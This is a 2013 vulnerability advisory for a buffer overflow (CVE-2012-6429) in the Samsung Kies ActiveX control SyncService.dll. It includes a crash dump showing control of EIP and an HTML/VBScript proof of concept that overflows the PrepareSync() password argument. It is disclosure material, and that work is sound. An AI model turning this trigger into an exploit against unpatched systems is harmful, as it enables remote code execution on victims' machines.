Vendor: Samsung Electronics
Vulnerable Version(s): 2.5.0.12114_1
Tested Version: 2.5.0.12114_1 on Windows 7 SP1 and Internet Explorer 9.0
Vendor Notification: December 19, 2012 
Vendor Patch: December 27, 2012 
Public Disclosure: January 9, 2013 
Vulnerability Type: Buffer Errors [CWE-119]
CVE Reference: CVE-2012-6429
CVSSv2 Base Score: 9.3 (AV:N/AC:H/Au:N/C:C/I:C/A:C)
Solution Status: Fixed by Vendor
Risk Level: Critical 
Discovered and Provided: High-Tech Bridge Security Research Lab ( https://www.htbridge.com/advisory/ ) 

-----------------------------------------------------------------------------------------------

Advisory Details:

High-Tech Bridge Security Research Lab has discovered buffer overflow vulnerability in Samsung Kies, which can be exploited to execute arbitrary code on vulnerable system.


1) Buffer overflow in Samsung Kies: CVE-2012-6429

The vulnerability exists due to insufficient sanitisation of input data in the PrepareSync() method within the ActiveX control SyncService.dll, GUID { EA8A3985-F9DF-4652-A255-E4E7772AFCA8 }, located by default in "C:\Program Files\Samsung\Kies\External\DeviceModules\SyncService.dll".
A remote attacker can pass an arbitrary value to the "password" argument of the PrepareSync() method and trigger an ACCESS_VIOLATION exception, which could be exploited to successfully overwrite the EIP register and the SEH structure. 

Taking into consideration the Unicode Format nature of this vulnerability,
in order to efficiently exploit the vulnerability.


Crash details:

(9b4.720): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000000 ebx=00000000 ecx=00410041 edx=771b71ad esi=00000000 edi=00000000
eip=00410041 esp=001fe2d0 ebp=001fe2f0 iopl=0         nv up ei pl zr na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246
00410041 ??              ???


The following PoC (Proof-of-concept) code demonstrates buffer overflow vulnerability:


<html>
<!-- (c)oded by High-Tech Bridge Security Research Lab -->
<head>
<title>Remote Buffer Overflow Vulnerability in Samsung Kies v. 2.5.0.12114_1 </title>
</head>
<script language=&#039;vbscript&#039;>
Sub PoC()
arg1="defaultV"
  arg2=String(14356, "A")
  arg3=1
  arg4=1
 Target.PrepareSync arg1 ,arg2 ,arg3 ,arg4
End Sub
</script>
<body>
<h3>Remote Buffer Overflow Vulnerability in Samsung Kies by High-Tech Bridge Security Research Lab</h3>
<input language=VBScript onclick=PoC() type=button value="Proof of Concept">
</body>
<object classid=&#039;clsid:EA8A3985-F9DF-4652-A255-E4E7772AFCA8&#039;id=&#039;Target&#039;></object>
</html>


-----------------------------------------------------------------------------------------------

Solution:

Vulnerability is fixed by vendor in version 2.5.1.12123_2_7
Download it at http://www.samsung.com/kies 

-----------------------------------------------------------------------------------------------

